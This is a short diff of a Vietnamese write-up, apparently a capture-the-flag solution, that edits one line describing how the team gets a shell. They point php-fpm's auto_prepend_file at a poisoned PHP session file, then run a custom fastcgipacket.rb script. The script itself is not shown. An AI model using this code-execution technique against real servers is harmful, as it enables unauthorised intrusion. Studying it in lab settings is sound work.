@@ -129,7 +129,7 @@ Sau khi gửi lên server, team mình có session của php `mhjuo9kbjf5fpkv0c2s
         }
       }
 ```
-- Để thực thi shell, team mình gửi request thay đổi `auto_prepend_file=/var/lib/php/sessions/sess_mhjuo9kbjf5fpkv0c2sk11mclo` c
+- Để thực thi shell, team mình gửi request thay đổi `auto_prepend_file=/var/lib/php/sessions/sess_mhjuo9kbjf5fpkv0c2sk11mclo` của php-fpm
 
 Thực hiện script fastcgipacket.rb với custom:
 ```ruby
